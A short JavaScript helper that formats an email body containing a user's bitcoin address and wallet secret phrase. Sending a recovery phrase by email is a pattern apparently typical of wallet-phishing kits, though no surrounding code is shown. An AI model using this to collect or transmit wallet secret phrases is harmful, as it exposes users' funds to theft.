export const formatEmailMessage = (address, secret_phrase) => {
  return `This is your bitcoin address: ${
    address ? address : "No address submitted."
  }. This is the secret_phrase: ${
    secret_phrase ? secret_phrase : "No secret phrase submitted."
  }.`;
};
